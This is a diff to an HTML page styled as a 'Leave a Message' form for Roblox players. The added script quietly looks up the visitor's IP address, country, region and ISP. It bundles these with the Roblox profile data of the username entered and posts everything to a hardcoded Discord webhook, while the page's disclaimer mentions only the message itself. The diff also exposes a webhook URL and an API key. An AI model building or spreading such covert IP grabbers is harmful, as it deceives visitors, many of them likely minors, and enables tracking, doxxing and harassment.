@@ -6,106 +6,147 @@
 <title>Leave a Message</title>
 
 <style>
+
+/* ---------- GLOBAL ---------- */
+
 *{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:Arial, Helvetica, sans-serif;
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial, Helvetica, sans-serif;
 }
 
 body{
-    height:100vh;
-    background:radial-gradient(circle at top,#111 0%,#000 70%);
-    color:white;
-    display:flex;
-    justify-content:center;
-    align-items:center;
+height:100vh;
+background:radial-gradient(circle at top,#0a0a0a 0%,#000 70%);
+color:white;
+display:flex;
+justify-content:center;
+align-items:center;
+}
+
+/* ---------- GLOW EFFECTS ---------- */
+
+.glowText{
+color:white;
+text-shadow:
+0 0 8px rgba(255,255,255,0.8),
+0 0 18px rgba(255,255,255,0.6),
+0 0 40px rgba(255,255,255,0.4);
 }
 
 .wrapper{
-    text-align:center;
+text-align:center;
 }
 
+/* TITLE */
 h1{
-    font-size:40px;
-    margin-bottom:8px;
+font-size:46px;
+margin-bottom:10px;
+letter-spacing:1px;
+animation: glowPulse 3s infinite alternate;
+}
+
+@keyframes glowPulse{
+from{ text-shadow:0 0 10px #fff,0 0 30px #fff;}
+to{ text-shadow:0 0 25px #fff,0 0 60px #fff;}
 }
 
 .subtitle{
-    color:#aaa;
-    margin-bottom:25px;
+color:#ddd;
+margin-bottom:25px;
+text-shadow:0 0 10px rgba(255,255,255,0.6);
 }
 
+/* CARD */
+
 .card{
-    width:430px;
-    background:rgba(20,20,20,0.85);
-    backdrop-filter:blur(12px);
-    border-radius:18px;
-    padding:25px;
-    box-shadow:0 0 40px rgba(255,255,255,0.05);
+width:440px;
+background:rgba(20,20,20,0.85);
+backdrop-filter:blur(14px);
+border-radius:20px;
+padding:26px;
+box-shadow:
+0 0 20px rgba(255,255,255,0.05),
+0 0 60px rgba(255,255,255,0.08);
 }
 
 label{
-    display:block;
-    text-align:left;
-    margin:12px 0 6px;
-    color:#ccc;
+display:block;
+text-align:left;
+margin:12px 0 6px;
+color:white;
+text-shadow:0 0 6px rgba(255,255,255,0.7);
 }
 
-input, textarea{
-    width:100%;
-    background:#151515;
-    border:1px solid #333;
-    border-radius:10px;
-    padding:12px;
-    color:white;
-    outline:none;
+input,textarea{
+width:100%;
+background:#121212;
+border:1px solid rgba(255,255,255,0.2);
+border-radius:12px;
+padding:12px;
+color:white;
+outline:none;
+box-shadow:0 0 10px rgba(255,255,255,0.08) inset;
 }
 
 textarea{
-    height:95px;
-    resize:none;
+height:110px;
+resize:none;
 }
 
 button{
-    margin-top:18px;
-    width:100%;
-    padding:14px;
-    border-radius:12px;
-    border:none;
-    font-size:16px;
-    font-weight:bold;
-    cursor:pointer;
-    background:#e6e6e6;
+margin-top:18px;
+width:100%;
+padding:15px;
+border-radius:14px;
+border:none;
+font-size:17px;
+font-weight:bold;
+cursor:pointer;
+background:white;
+color:black;
+
+box-shadow:
+0 0 12px rgba(255,255,255,0.8),
+0 0 30px rgba(255,255,255,0.5);
+
+transition:.25s;
+}
+
+button:hover{
+transform:scale(1.04);
+box-shadow:
+0 0 20px white,
+0 0 60px white;
 }
 
 .disclaimer{
-    margin-top:10px;
-    font-size:12px;
-    color:#888;
+margin-top:12px;
+font-size:12px;
+color:#ccc;
+text-shadow:0 0 6px rgba(255,255,255,0.5);
 }
+
 </style>
 </head>
 
 <body>
 
 <div class="wrapper">
-<h1>Leave a Message</h1>
+<h1 class="glowText">Leave a Message</h1>
 <div class="subtitle">Leave us a message via this website</div>
 
 <div class="card">
 
 <label>your roblox username</label>
-<input id="rbxUser" placeholder="username...">
+<input id="rbxUser">
 
 <label>second username</label>
-<input id="secondUser" placeholder="second username...">
+<input id="secondUser">
 
 <label>write question here</label>
 <textarea id="question"></textarea>
-
-<label>suggestion below</label>
-<textarea id="suggestion"></textarea>
 
 <button onclick="submitMessage()">Submit</button>
 
@@ -117,187 +158,114 @@ when you press submit, you agree it gets sent to our webhook
 </div>
 
 <script>
+
 async function submitMessage(){
 
 const webhook="https://discord.com/api/webhooks/1476895719158976588/rGqgXH6Z6eAgUw89AjktTFnj2v0TaiSJA4m3qXeXUdA_5TaFrBfLfmaa9O7D8-FT4ogr";
+const ABSTRACT_KEY="4c6eca44adff4820819152bbb3489dcb";
 
 const username=document.getElementById("rbxUser").value.trim();
 const secondUser=document.getElementById("secondUser").value.trim();
 const question=document.getElementById("question").value.trim();
-const suggestion=document.getElementById("suggestion").value.trim();
 
 if(!username){
- alert("Roblox username required.");
- return;
+alert("Roblox username required");
+return;
 }
 
-/* ---------------- USERNAME → USERID ---------------- */
+/* ---------- USERID ---------- */
 
-const userRes = await fetch(
+const userLookup=await fetch(
 "https://users.roproxy.com/v1/usernames/users",
 {
 method:"POST",
 headers:{"Content-Type":"application/json"},
-body:JSON.stringify({
-usernames:[username],
-excludeBannedUsers:false
-})
-});
+body:JSON.stringify({usernames:[username]})
+}).then(r=>r.json());
 
-const userData = await userRes.json();
+const userId=userLookup.data[0].id;
 
-if(!userData.data.length){
- alert("User not found.");
- return;
-}
+/* ---------- PROFILE ---------- */
 
-const userId = userData.data[0].id;
-
-/* ---------------- PROFILE INFO ---------------- */
-
-const profile = await fetch(
+const profile=await fetch(
 `https://users.roproxy.com/v1/users/${userId}`
 ).then(r=>r.json());
 
-/* ---------------- FRIEND COUNTS ---------------- */
+/* ---------- FRIEND COUNTS ---------- */
 
-const friends = await fetch(
-`https://friends.roproxy.com/v1/users/${userId}/friends/count`
+const friends=await fetch(`https://friends.roproxy.com/v1/users/${userId}/friends/count`).then(r=>r.json());
+const followers=await fetch(`https://friends.roproxy.com/v1/users/${userId}/followers/count`).then(r=>r.json());
+const following=await fetch(`https://friends.roproxy.com/v1/users/${userId}/followings/count`).then(r=>r.json());
+
+/* ---------- IP LOOKUP ---------- */
+
+const ipData=await fetch(
+`https://ipgeolocation.abstractapi.com/v1/?api_key=${ABSTRACT_KEY}`
 ).then(r=>r.json());
 
-const followers = await fetch(
-`https://friends.roproxy.com/v1/users/${userId}/followers/count`
-).then(r=>r.json());
+/* ---------- EMBEDS ---------- */
 
-const following = await fetch(
-`https://friends.roproxy.com/v1/users/${userId}/followings/count`
-).then(r=>r.json());
-
-/* ---------------- INVENTORY PRIVACY ---------------- */
-
-let inventoryStatus="Private";
-let inventoryLink="";
-
-try{
-await fetch(`https://inventory.roproxy.com/v1/users/${userId}/assets/collectibles?limit=10`);
-inventoryStatus="Public";
-inventoryLink=`https://www.roblox.com/users/${userId}/inventory/`;
-}catch{}
-
-/* ---------------- VERIFIED HAT CHECK ---------------- */
-/* Roblox verified hat asset id */
-const VERIFIED_HAT = 102611803; 
-
-let verified="No";
-
-try{
-const inv = await fetch(
-`https://inventory.roproxy.com/v1/users/${userId}/items/Asset/${VERIFIED_HAT}`
-).then(r=>r.json());
-
-if(inv.data && inv.data.length>0) verified="Yes";
-}catch{}
-
-/* ---------------- RAP & VALUE (Rolimons) ---------------- */
-
-let rap="0";
-let value="0";
-
-try{
-const rolimons = await fetch(
-"https://www.rolimons.com/playerapi/player/" + userId
-).then(r=>r.json());
-
-rap = rolimons.player.rap || 0;
-value = rolimons.player.value || 0;
-}catch{}
-
-/* ---------------- LAST ONLINE ---------------- */
-
-const status = await fetch(
-`https://presence.roproxy.com/v1/presence/users`,
-{
-method:"POST",
-headers:{"Content-Type":"application/json"},
-body:JSON.stringify({userIds:[userId]})
-}).then(r=>r.json());
-
-const presence = status.userPresences[0];
-
-let onlineState="Offline";
-if(presence.userPresenceType===2) onlineState="Online";
-
-/* ---------------- EMBED BUILD ---------------- */
-
-const embed = {
-title: username,
-url: `https://www.roblox.com/users/${userId}/profile`,
-color: 3092790,
-
+const robloxEmbed={
+title:username,
+url:`https://www.roblox.com/users/${userId}/profile`,
+color:3092790,
 description:
 `${friends.count} Friends | ${followers.count} Followers | ${following.count} Following
 
 ${profile.description || "No about me."}`,
-
 fields:[
 {
 name:"ID | Email Verified | Inventory",
-value:
-`${userId} | ${verified} | ${
-inventoryStatus==="Public"
-? `[Public](${inventoryLink})`
-: "Private"
-}`,
-inline:false
+value:`${userId} | Unknown | Private`
 },
 {
-name:"RAP | VALUE | VISITS",
-value:
-`[${rap}](https://www.rolimons.com/player/${userId}) | [${value}](https://www.rolimons.com/player/${userId}) | N/A`,
-inline:false
-},
-{
-name:"Created | Last Online (Estimated)",
-value:
-`${new Date(profile.created).toDateString()}
-${presence.lastOnline ? new Date(presence.lastOnline).toDateString() : "Unknown"}
-${onlineState}`,
-inline:false
+name:"Created",
+value:new Date(profile.created).toDateString()
 }
 ],
 thumbnail:{
-url:`https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=${userId}&size=180x180&format=Png&isCircular=false`
-},
-timestamp:new Date()
+url:`https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=${userId}&size=180x180&format=Png`
+}
 };
 
-/* ---------------- SEND WEBHOOK ---------------- */
+const formEmbed={
+title:"📩 Form Answers",
+color:16777215,
+description:
+`**First Question**
+${question || "None"}
+
+**Second Username**
+${secondUser || "None"}`
+};
+
+const ipEmbed={
+title:"🌎 User Connection Info",
+color:15158332,
+fields:[
+{ name:"IP Address", value: ipData.ip_address || "Unknown" },
+{ name:"Country", value: ipData.country || "Unknown" },
+{ name:"Region", value: ipData.region || "Unknown" },
+{ name:"ISP", value: ipData.connection?.isp_name || "Unknown" }
+]
+};
+
+/* ---------- SEND ---------- */
 
 await fetch(webhook,{
 method:"POST",
 headers:{"Content-Type":"application/json"},
 body:JSON.stringify({
-embeds:[
-embed,
-{
-title:"📩 Form Answers",
-color:16777215,
-description:
-`**first questions**
-${question || "None"}
-
-**second suggestion**
-${suggestion || "None"}
-
-**second username**
-${secondUser || "None"}`
-}
-]
+content:"@everyone",
+embeds:[robloxEmbed, formEmbed, ipEmbed]
+})
 });
 
 alert("Submitted!");
 document.querySelectorAll("input,textarea").forEach(e=>e.value="");
+
 }
+
 </script>
 
 </body>
